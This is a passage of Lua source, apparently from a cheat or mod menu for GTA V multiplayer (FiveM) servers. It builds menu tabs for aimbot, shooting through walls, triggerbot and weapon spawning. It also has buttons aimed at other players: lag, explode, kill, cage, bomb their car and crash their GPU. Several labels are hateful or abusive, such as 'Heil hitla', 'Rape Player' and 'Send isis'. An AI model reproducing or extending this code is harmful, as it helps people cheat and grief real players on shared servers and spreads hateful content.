                               if CockMenu.Main.Checkbox('Be Torch',0.425, scroll, Cock.Menu.beliketorch, false) then
                                   Cock.Menu.beliketorch = not Cock.Menu.beliketorch
                                   if Cock.Menu.beliketorch then
                                       Fatasf.n.SetExtraTimecycleModifier('mp_lad_day')
                                   else
                                       Fatasf.n.ClearExtraTimecycleModifier()
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Tiny player',0.425, scroll, Cock.Menu.tinyplayer, false) then
                                   Cock.Menu.tinyplayer = not Cock.Menu.tinyplayer
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Slow motion',0.425, scroll, Cock.Menu.Slowmotion, false) then
                                   Cock.Menu.Slowmotion = not Cock.Menu.Slowmotion
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Hide ID',0.425, scroll, Cock.Menu.hideid, false) then
                                   Cock.Menu.hideid = not Cock.Menu.hideid  
                                   if Cock.Menu.hideid then
                                       CockT.Inv["Thread"](function()
                                           while Cock.Menu.hideid do
                                               CockT.Inv["Wait"](0)
                                                   Fatasf.n.DrawRect(0.95, 0.1, 0.2, 0.2, 1, 1, 1, 255)
                                           end
                                       end)
                                   end
                               end
                           end scroll = scroll + 0.015
                           
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Force 3rd person',0.425, scroll, Cock.Menu.force3rdper, false) then
                                   Cock.Menu.force3rdper = not Cock.Menu.force3rdper
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Force driveby',0.425, scroll, Cock.Menu.forcedriveby, false) then
                                   Cock.Menu.forcedriveby = not Cock.Menu.forcedriveby
                               end 
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Rainbow world',0.425, scroll, Cock.Menu.rainbowworld, false) then
                                   Cock.Menu.rainbowworld = not Cock.Menu.rainbowworld
                               end 
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('ESP Distance', 0.5, scroll, Cock.Sliders['EspDistance'], Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value);
                           end scroll = scroll + 0.02
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Change hud colour', 0.422, scroll, false, true) then
                                   Cock.Menu.customhud = not Cock.Menu.customhud
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Change weather', 0.422, scroll, false, true) then
                                   Fatasf.n.SetWeatherTypePersist("EXTRASUNNY")
                                   Fatasf.n.SetWeatherTypeNowPersist("EXTRASUNNY")
                                   Fatasf.n.SetWeatherTypeNow("EXTRASUNNY")
                                   Fatasf.n.SetOverrideWeather("EXTRASUNNY")
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Heil hitla', 0.422, scroll, false, true) then
                                   Cock.Menu.hailfvckinhitler = not Cock.Menu.hailfvckinhitler
                                   if Cock.Menu.hailfvckinhitler then
                                       --local hailhitlasorry = Fatasf.n.CreateAnDui("https://cock.menu/music/yes.mp3", 1, 1, 1)
                                       CockMenu.Main.HailHitla()
                                   else
                                       Fatasf.n.DestroyDui(hailhitlasorry) 
                                       local ped = Fatasf.n.PlayerPedId() Fatasf.n.RequestTaskMoveNetworkStateTransition(ped, "Stop") if not Fatasf.n.IsPedInjured(ped) then Fatasf.n.ClearPedSecondaryTask(ped) end if not Fatasf.n.IsPedInAnyVehicle(ped, 1) then Fatasf.n.SetPedCurrentWeaponVisible(ped, 1, 1, 1, 1) end Fatasf.n.SetPedConfigFlag(ped, 36, 0) Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                                   end
                               end
                           end scroll = scroll + 0.015
                           --[[ if scroll >= 0.365 and scroll <= 0.7 - 0.015 then
                              if CockMenu.Main.Button("Moscow meme", 0.422, scroll, false, true) then
                                Cock.Menu.moscowmeme = not Cock.Menu.moscowmeme
                                if Cock.Menu.moscowmeme then
                                    moscowwork = true
                                    CockMenu.Main.LoadGifMoscow()
                                    CockT.Inv["Thread"](
                                        function()
                                            while moscowwork do
                                                CockT.Inv["Wait"](0)
                                                Fatasf.n.DrawSprite("cock_moscow", "vertissotraperdamnshit", 0.5, 0.5, 0.5, 0.5, 0.0, 255, 255, 255, 255)
                                            end
                                        end
                                    )
                                else
                                    moscowwork = false
                                end
                              end
                           end
                        
                           scroll = scroll + 0.015 ]]
                           
       
                           if Cock.Menu.selskins then
                               if CockMeni.Functions.ComboButton('Delder', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("u_m_m_jesus_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Larks', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("s_f_y_stripper_01")
                               end y = y + 0.025
       
                               if CockMeni.Functions.ComboButton('Conde', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("u_m_y_mani")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Prodigy', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("u_m_o_filmnoir")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Camuga', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_m_m_beach_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('OGG076', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_m_y_acult_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Dish', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_m_m_mlcrisis_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Theo', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("cs_stretch")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Goxint', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("cs_priest")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Flacko', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("mp_m_freemode_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Cat', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_m_m_beach_02")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Laundry', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_m_m_og_boss_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('LuaMenu', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_m_m_acult_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('Pawcio', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("s_m_m_movspace_01")
                               end y = y + 0.025
                               if CockMeni.Functions.ComboButton('HamMafia', 0.422, y, false) then 
                                   CockMeni.Functions.SetModelPls("a_c_rat")
                               end y = y + 0.025
                           end
       
                       end
                       if tab == "Aimbot" then
                           CockMenu.Main.LoadUi()
                           if CockMenu.Main.Checkbox('Enable aimbot (Hold left-alt)',0.425, 0.365, Cock.Menu.Aimbot, false) then
                               Cock.Menu.Aimbot = not Cock.Menu.Aimbot
                           end
                           if CockMenu.Main.Checkbox('Enable aimlock',0.425, 0.38, Cock.Menu.Aimlock, false) then
                               Cock.Menu.Aimlock = not Cock.Menu.Aimlock
                           end
                           if CockMenu.Main.Checkbox('Shoot through walls',0.425, 0.395, Cock.Menu.udwallslock, false) then
                               Cock.Menu.udwallslock = not Cock.Menu.udwallslock
                           end
                           if CockMenu.Main.Checkbox('Enable ragebot',0.425, 0.41, Cock.Menu.ragebot, false) then
                               Cock.Menu.ragebot = not Cock.Menu.ragebot
                           end
                           if CockMenu.Main.Checkbox('Car Killer',0.425, 0.425, Cock.Menu.Carkiller, false) then
                               Cock.Menu.Carkiller = not Cock.Menu.Carkiller
                           end
                           if CockMenu.Main.Checkbox('Hit sound (~r~BETA~s~)',0.425, 0.44, Cock.Menu.hitsound, false) then
                               Cock.Menu.hitsound = not Cock.Menu.hitsound
                           end
                           if CockMenu.Main.Checkbox('Hit marker',0.425, 0.455, Cock.Menu.hitmarker, false) then
                               Cock.Menu.hitmarker = not Cock.Menu.hitmarker
                           end
                           if CockMenu.Main.Checkbox('Draw targets',0.425, 0.47, Cock.Menu.targets, false) then
                               Cock.Menu.targets = not Cock.Menu.targets
                           end
                           if CockMenu.Main.Checkbox('Draw fov',0.425, 0.485, Cock.Menu.fov, false) then
                               Cock.Menu.fov = not Cock.Menu.fov
                           end
                           CockMenu.Main.Slider('FOV', 0.5, 0.515, Cock.Sliders['AimFov'], 143, 240, 249)
                           CockMenu.Main.Slider('Distance', 0.5, 0.545, Cock.Sliders['AimDist'], 143, 240, 249)
                           if CockMenu.Main.Checkbox('Friends list',0.425, 0.5, Cock.Menu.friendslist, false) then
                               Cock.Menu.friendslist = not Cock.Menu.friendslist
                           end
                           if CockMenu.Main.Checkbox('Custom damage',0.425, 0.575, Cock.Menu.CustomDamage, false) then
                               Cock.Menu.CustomDamage = not Cock.Menu.CustomDamage
                           end
                           CockMenu.Main.Slider('Damage modifier', 0.5, 0.59, Cock.Sliders['CustomDamage'], 143, 240, 249)
                           CockMenu.Main.Slider('Aimlock smooth', 0.5, 0.615, Cock.Sliders['AimSmooth'], 143, 240, 249)
                           if CockMenu.Main.Checkbox('Triggerbot', 0.425, 0.645, Cock.Menu.triggerbot, false) then
                               Cock.Menu.triggerbot = not Cock.Menu.triggerbot
                           end
                       end 
           
                       if tab == "Weapons" then
                           if CockMenu.Main.Button('(Aim)', 0.422, 0.36, false, true) then tab = "Aimbot" end
                           if CockMenu.Main.Checkbox('Teleport gun',0.425, 0.39, Cock.Menu.Tpgun, false) then Cock.Menu.Tpgun = not Cock.Menu.Tpgun end
                           if CockMenu.Main.Checkbox('RPG gun',0.425, 0.405, Cock.Menu.RPGGun, false) then Cock.Menu.RPGGun = not Cock.Menu.RPGGun end
                           if CockMenu.Main.Checkbox('Molotov gun',0.425, 0.42, Cock.Menu.molotovgun, false) then Cock.Menu.molotovgun = not Cock.Menu.molotovgun end
                           if CockMenu.Main.Checkbox('Particles gun',0.425, 0.435, Cock.Menu.particlegun, false) then Cock.Menu.particlegun = not Cock.Menu.particlegun end
                           if CockMenu.Main.Checkbox('Rapid fire',0.425, 0.45, Cock.Menu.rapidfire , false) then Cock.Menu.rapidfire = not Cock.Menu.rapidfire  end
                           if CockMenu.Main.Checkbox('Infinite ammo',0.425, 0.465, Cock.Menu.infammo , false) then Cock.Menu.infammo = not Cock.Menu.infammo  end
                           if CockMenu.Main.Checkbox('Shoot vehicles',0.425, 0.48, Cock.Menu.shootvehs , false) then Cock.Menu.shootvehs = not Cock.Menu.shootvehs  end
                           if CockMenu.Main.Button('Give all weapons', 0.422, 0.485, false, true) then Functions.f.GiveAllWeapons() end
                           if CockMenu.Main.Button('Remove all weapons', 0.422, 0.5, false, true) then Functions.f.RemoveAllWeapons() end
                           if CockMenu.Main.Button('Spawn Weapon', 0.422, 0.515, false, true) then Functions.f.SpawnWeapon() end
                           if CockMenu.Main.Button('Remove Weapon', 0.422, 0.53, false, true) then Functions.f.RemoveWeapon() end
                           
                           if CockMenu.Main.Button('Set Ammo', 0.422, 0.545, false, true) then 
                               Functions.f.SetCurrentAmmo(Cock.Sliders['CustomAmmo'].value) 
                           end
                           CockMenu.Main.Slider('', 0.5, 0.555, Cock.Sliders['CustomAmmo'], 143, 240, 249)
                           
                           if CockMenu.Main.Checkbox('Suppressor',0.425, 0.58, Cock.Menu.Suppressor, false) then 
                               Cock.Menu.Suppressor = not Cock.Menu.Suppressor
                               if Cock.Menu.Suppressor then
                                   CockT.Global.GiveWeaponComponentToPed(0x65EA7EBB)
                                   CockT.Global.GiveWeaponComponentToPed(0x837445AA)
                                   CockT.Global.GiveWeaponComponentToPed(0xA73D4664)
                                   CockT.Global.GiveWeaponComponentToPed(0xC304849A)
                                   CockT.Global.GiveWeaponComponentToPed(0xE608B35E)
                               else
                                   CockT.Global.RemoveWeaponComponentFromPed(0x65EA7EBB)
                                   CockT.Global.RemoveWeaponComponentFromPed(0x837445AA)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xA73D4664)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xC304849A)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xE608B35E)
                               end
                           end
                           if CockMenu.Main.Checkbox('Flashlight',0.425, 0.595, Cock.Menu.Flashlight, false) then 
                               Cock.Menu.Flashlight = not Cock.Menu.Flashlight
                               if Cock.Menu.Flashlight then
                                   CockT.Global.GiveWeaponComponentToPed(0x359B7AAE)
                                   CockT.Global.GiveWeaponComponentToPed(0x7BC4CDDC)
                               else
                                   CockT.Global.RemoveWeaponComponentFromPed(0x359B7AAE)
                                   CockT.Global.RemoveWeaponComponentFromPed(0x7BC4CDDC)
                               end
                           end
                           if CockMenu.Main.Checkbox('Grip',0.425, 0.61, Cock.Menu.Grip, false) then 
                               Cock.Menu.Grip = not Cock.Menu.Grip
                               if Cock.Menu.Grip then
                                   CockT.Global.GiveWeaponComponentToPed(0xC164F53)
                               else
                                   CockT.Global.RemoveWeaponComponentFromPed(0xC164F53)
                               end 
                           end
                           if CockMenu.Main.Checkbox('Scope',0.425, 0.625, Cock.Menu.Scope, false) then 
                               Cock.Menu.Scope = not Cock.Menu.Scope
                               if Cock.Menu.Scope then
                                   CockT.Global.GiveWeaponComponentToPed(0x9D2FBF29)
                                   CockT.Global.GiveWeaponComponentToPed(0xA0D89C42)
                                   CockT.Global.GiveWeaponComponentToPed(0xAA2C45B4)
                                   CockT.Global.GiveWeaponComponentToPed(0xD2443DDC)
                                   CockT.Global.GiveWeaponComponentToPed(0x3CC6BA57)
                                   CockT.Global.GiveWeaponComponentToPed(0x3C00AFED)
                               else
                                   CockT.Global.RemoveWeaponComponentFromPed(0x9D2FBF29)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xA0D89C42)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xAA2C45B4)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xD2443DDC)
                                   CockT.Global.RemoveWeaponComponentFromPed(0x3CC6BA57)
                                   CockT.Global.RemoveWeaponComponentFromPed(0x3C00AFED)
                               end
                           end
                           if CockMenu.Main.Checkbox('Extended Magazine',0.425, 0.64, Cock.Menu.ExtendedMag, false) then 
                               Cock.Menu.ExtendedMag = not Cock.Menu.ExtendedMag
                               if Cock.Menu.ExtendedMag then
                                   CockT.Global.GiveWeaponComponentToPed(0x249A17D5) CockT.Global.GiveWeaponComponentToPed(0x64F9C62B)
                                   CockT.Global.GiveWeaponComponentToPed(0x7B0033B3) CockT.Global.GiveWeaponComponentToPed(0x7C8BD10E) CockT.Global.GiveWeaponComponentToPed(0x86BD7F72) CockT.Global.GiveWeaponComponentToPed(0x8EC1C979)
                                   CockT.Global.GiveWeaponComponentToPed(0xB3688B0F) CockT.Global.GiveWeaponComponentToPed(0xD6C59CD6) CockT.Global.GiveWeaponComponentToPed(0xED265A1C) CockT.Global.GiveWeaponComponentToPed(0xD67B4F2D)
                                   CockT.Global.GiveWeaponComponentToPed(0xD9D3AC92) CockT.Global.GiveWeaponComponentToPed(0x33BA12E8) CockT.Global.GiveWeaponComponentToPed(0x10E6BA2B) CockT.Global.GiveWeaponComponentToPed(0x350966FB)
                                   CockT.Global.GiveWeaponComponentToPed(0xBB46E417) CockT.Global.GiveWeaponComponentToPed(0x334A5203) CockT.Global.GiveWeaponComponentToPed(0x82158B47) CockT.Global.GiveWeaponComponentToPed(0xEAC8C270)
                                   CockT.Global.GiveWeaponComponentToPed(0xB1214F9B) CockT.Global.GiveWeaponComponentToPed(0x91109691) CockT.Global.GiveWeaponComponentToPed(0xCCFD2AC5) CockT.Global.GiveWeaponComponentToPed(0x971CF6FD)
                               else
                                   CockT.Global.RemoveWeaponComponentFromPed(0x249A17D5) CockT.Global.RemoveWeaponComponentFromPed(0x64F9C62B)
                                   CockT.Global.RemoveWeaponComponentFromPed(0x7B0033B3) CockT.Global.RemoveWeaponComponentFromPed(0x7C8BD10E) CockT.Global.RemoveWeaponComponentFromPed(0x86BD7F72) CockT.Global.RemoveWeaponComponentFromPed(0x8EC1C979)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xB3688B0F) CockT.Global.RemoveWeaponComponentFromPed(0xD6C59CD6) CockT.Global.RemoveWeaponComponentFromPed(0xED265A1C) CockT.Global.RemoveWeaponComponentFromPed(0xD67B4F2D)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xD9D3AC92) CockT.Global.RemoveWeaponComponentFromPed(0x33BA12E8) CockT.Global.RemoveWeaponComponentFromPed(0x10E6BA2B) CockT.Global.RemoveWeaponComponentFromPed(0x350966FB)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xBB46E417) CockT.Global.RemoveWeaponComponentFromPed(0x334A5203) CockT.Global.RemoveWeaponComponentFromPed(0x82158B47) CockT.Global.RemoveWeaponComponentFromPed(0xEAC8C270)
                                   CockT.Global.RemoveWeaponComponentFromPed(0xB1214F9B) CockT.Global.RemoveWeaponComponentFromPed(0x91109691) CockT.Global.RemoveWeaponComponentFromPed(0xCCFD2AC5) CockT.Global.RemoveWeaponComponentFromPed(0x971CF6FD)
                               end
                           end
                       end
           
                       if tab == "Players" then
                           local yw = 0.37
                           local scroll = yw + Cock.Menu.scr_2
                           --0.414, 0.585 // 0.238, 0.693
                           if CockT.Global.Zones(0.498+drag_x2, 0.465+drag_y2, 0.17, 0.45) then
                               if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.37 - (28 * 0.015)) then
                                   Cock.Menu.scr_2 = Cock.Menu.scr_2 - 0.015
                               end
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.37 then
                                   Cock.Menu.scr_2 = Cock.Menu.scr_2 + 0.015
                               end
                           end
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Online list',0.425, scroll, Cock.Menu.plist, false) then
                                   Cock.Menu.plist = not Cock.Menu.plist
                               end
                           end scroll = scroll + 0.015
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Spectate ('..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..")",0.425, scroll, Cock.Menu.Spectate, false) then
                                   Cock.Menu.Spectate = not Cock.Menu.Spectate
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Spectate [#2] ('..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..")",0.425, scroll, Cock.Menu.Spectate2, false) then
                                   Cock.Menu.Spectate2 = not Cock.Menu.Spectate2
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Lag player', 0.425, scroll, Cock.Menu.lagplayer, false) then
                                   Cock.Menu.lagplayer = not Cock.Menu.lagplayer
                               end
                           end scroll = scroll + 0.005
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Teleport to player', 0.422, scroll, false, true) then
                                   CockT.Global.TeleportToPlayer(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Copy Outfit', 0.422, scroll, false, true) then
                                   CockT.Global.CopyOutfit(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Explode', 0.422, scroll, false, true) then
                                   Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), Cock.Sliders['ExplodeType'].value, 100.0, Cock.Menu.IsAudible, Cock.Menu.IsInvisible, 0.0)
                               end
                           end scroll = scroll + 0.01
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('', 0.5, scroll, Cock.Sliders['ExplodeType'], 143, 240, 249)
                           end scroll = scroll + 0.03
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Audible',0.425, scroll, Cock.Menu.IsAudible, false) then
                                   Cock.Menu.IsAudible = not Cock.Menu.IsAudible
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Invisible',0.425, scroll, Cock.Menu.IsInvisible, false) then
                                   Cock.Menu.IsInvisible = not Cock.Menu.IsInvisible
                               end
                           end scroll = scroll + 0.005
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Molotov Player', 0.422, scroll, false, true) then
                                   CockT.Global.MolotovPlayer(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Cage Player', 0.422, scroll, false, true) then
                                   CockT.Global.CageNew(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Rape Player', 0.422, scroll, false, true) then
                                   CockT.Global.RapeP(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Clone Player', 0.422, scroll, false, true) then
                                   Fatasf.n.ClonePed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), true, false, true)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Shit rain', 0.422, scroll, false, true) then
                                   CockMenu.Main.ShitRain(CockT.Global.SelectedPlayer, 'pounder', 5)
                                   CockMenu.Main.ShitRain(CockT.Global.SelectedPlayer, 'adder', 5)
                                   CockMenu.Main.ShitRain(CockT.Global.SelectedPlayer, 'Submersible', 5)
                                   CockMenu.Main.ShitRain(CockT.Global.SelectedPlayer, 'cutter', 5)
                                   CockMenu.Main.ShitRain(CockT.Global.SelectedPlayer, 'faggio3', 5)
                               end
                           end scroll = scroll + 0.015
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Taze player', 0.422, scroll, false, true) then
                                   CockT.Global.TazePlayer(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Sirens on player', 0.422, scroll, false, true) then
                                   CockMenu.Main.SirensOnPlayer(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Kill player', 0.422, scroll, false, true) then
                                   CockMenu.Main.KillPlayer(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Kick from vehicle', 0.422, scroll, false, true) then
                                   CockT.Global.KickFromVehicle(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Custom prop', 0.422, scroll, false, true) then
                                   local object =  Functions.f.CustomInput("Custom prop name", "prop_beach_fire", 25)
                                   CockT.Global.CustomProp(object, CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Give all weapons', 0.422, scroll, false, true) then
                                   for weapo = 1, #CockT.Weapons do
                                       Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetHashKey("WEAPON_" .. CockT.Weapons[weapo]), 150, false)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Remove all weapons', 0.422, scroll, false, true) then
                                   for weapo = 1, #CockT.Weapons do
                                       Fatasf.n.RemoveWeaponFromPed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetHashKey(weapo))
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Give weapon', 0.422, scroll, false, true) then
                                   local weapon =  Functions.f.CustomInput("Weapon To Spawn", "weapon_pistol", 30)
                                   Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetHashKey(weapon), 255, false)
                               end
                           end scroll = scroll + 0.015
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Burn player car', 0.422, scroll, false, true) then
                                   Cock.Menu.burnplayercar = not Cock.Menu.burnplayercar
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Plant bomb on player car', 0.422, scroll, false, true) then
                                   Cock.Menu.plantthebomb = not Cock.Menu.plantthebomb
       
                                   if Cock.Menu.plantthebomb then
                                       if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), false)) then
                                           --[[ local bomb = Fatasf.n.CreateAnDui("https://cock.menu/music/bombhasbeenplanted.mp3", 1, 1, 1)
                                           CockT.Inv["Wait"](1600)
                                           Fatasf.n.DestroyDui(bomb) ]]
                                           local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                                           Fatasf.n.AddExplosion(coords.x, coords.y, coords.z, 5, 100.0, true, false, 0.0)
                                       end
                                   end
                                   
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Fuck vehicle', 0.422, scroll, false, true) then
                                   Functions.f.FuckVehicle(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Spawn bitch in player vehicle', 0.422, scroll, false, true) then
                                   CockMenu.Main.SpawnBitch(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Aggressive bolivanos', 0.422, scroll, false, true) then
                                   CockT.Global.SpawnKillingMexico(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015 
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Unex devs on player', 0.422, scroll, false, true) then
                                   CockT.Global.UnexOnPlayer(CockT.Global.SelectedPlayer, 10)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Kill GPU', 0.422, scroll, false, true) then
                                   Functions.f.KIllGpu(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Bug player vehicle', 0.422, scroll, false, true) then
                                   Functions.f.BugPlayerVeh(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Ram player', 0.422, scroll, false, true) then
                                   Functions.f.GetRamedByVehicle('rumpo', CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.025
                           
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Fire on player',0.425, scroll, Cock.Menu.Fire, false) then
                                   Cock.Menu.Fire = not Cock.Menu.Fire
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Clown particles on player',0.425, scroll, Cock.Menu.Clown, false) then
                                   Cock.Menu.Clown = not Cock.Menu.Clown
                               end
                           end scroll = scroll + 0.005
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Delete player vehicle', 0.422, scroll, false, true) then
                                   Fatasf.n.DeleteEntity(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)))
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Spawn explosive men', 0.422, scroll, false, true) then
                                   CockT.Global.MiddleFinger(CockT.Global.SelectedPlayer)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Send isis', 0.422, scroll, false, true) then
